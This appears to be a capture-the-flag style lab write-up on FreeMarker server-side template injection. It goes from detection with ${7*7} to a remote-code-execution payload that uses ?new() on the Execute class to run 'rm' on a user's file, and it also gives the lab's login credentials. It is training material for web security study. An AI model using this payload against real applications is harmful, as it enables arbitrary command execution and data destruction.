## Server-side template injection using documentation

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:

content-manager:C0nt3ntM4n4g3r

Hint : 

You should try solving this lab using only the documentation. However, if you get really stuck, you can try finding a well-known exploit by @albinowax that you can use to solve the lab.

## Notes

- /login
- Edit content feature

## Resume

1. Identify template injection
2. Confirm Freemarker syntax
3. Test arithmetic evaluation
4. Research dangerous Freemarker built-ins
5. Abuse `new()`
6. Instantiate `Execute`
7. Execute OS command
8. Delete Carlos's file

## Solve

Go to any product page and use the **edit template** feature.

Inside the editable template we can see Freemarker expressions such as:

```html
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
```

This indicates that user input is interpreted by the template engine.

To confirm SSTI, inject a mathematical expression:

```freemarker
${7*7}
```

After saving the template and loading the product page, the application renders:

```text
49
```

This confirms that expressions inside:

```freemarker
${...}
```

are evaluated server-side.

Next, identify the template engine.

Injecting an invalid variable such as:

```freemarker
${foobar}
```

triggers an error message mentioning:

```text
FreeMarker template error
```

confirming that the application uses the **Freemarker** template engine.

Researching the Freemarker documentation reveals that the dangerous built-in:

```freemarker
?new()
```

can instantiate arbitrary Java objects.

The documentation also references the class:

```java
freemarker.template.utility.Execute
```

which allows execution of operating system commands.

Using:

```freemarker
"freemarker.template.utility.Execute"?new()
```

we can instantiate the Execute utility object.

The final payload becomes:

```freemarker
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

Breakdown:

- `"freemarker.template.utility.Execute"` → references the Execute class
- `?new()` → instantiates the class
- `("rm /home/carlos/morale.txt")` → executes the system command

The application effectively evaluates:

```java
Execute.exec("rm /home/carlos/morale.txt")
```

which deletes Carlos's file and solves the lab.

Final payload:

```freemarker
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```